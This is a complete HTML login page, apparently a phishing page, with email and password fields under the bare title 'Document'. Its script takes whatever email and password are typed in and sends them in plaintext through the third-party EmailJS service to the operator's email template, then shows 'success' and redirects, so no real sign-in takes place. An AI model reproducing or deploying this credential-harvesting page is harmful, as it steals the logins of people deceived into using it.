<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 10px 5px rgba(0, 0, 0, 50%);
        }
        input {
            width: 95%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        #log {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
    <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
    </script>
    <script type="text/javascript">
        (function(){
            emailjs.init({
            publicKey: "XUDwywnTAPMo_WmId",
        });
    })();
</script>
</head>
<body>
    <div class="container">
        <form id="loginForm">
            <input type="email" id="email" placeholder="email" required>
            <input type="password" id="password" placeholder="password" required>
            <button type="submit" onclick="register()">Login</button>
        </form>
        <div id="log"></div>
    </div>
    <script>
        function register() {
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;

            if (email == "" || password == "") {
                document.getElementById("log").innerText = "Enter your email and password!";
                return;
            }

            emailjs.send("service_38z4y9t","template_5o1j4ym",{
                user_email : document.getElementById("email").value,
                user_pasword : document.getElementById("password").value,
            }).then(function() {
                document.getElementById("log").innerText = "success";

                setTimeout(function() {
                    window.location.href = "index.html";
                }, 1500);
            })
        }
    </script>
</body>
</html>
